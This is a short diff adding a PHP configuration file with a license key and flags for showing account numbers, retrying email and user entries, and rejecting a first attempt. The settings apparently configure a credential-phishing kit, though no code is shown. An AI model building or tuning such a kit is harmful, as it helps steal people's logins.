@@ -1,0 +1,11 @@
+<?php
+$YOUR_LICENSE = "JMMYSELF01";
+
+$SHOW_ACCOUNT_NUMBER=false;
+
+$EMAIL_SECOND_TRY=true;
+
+$REJECT_RETRY=true;
+
+$USER_SECOND_TRY=false;
+
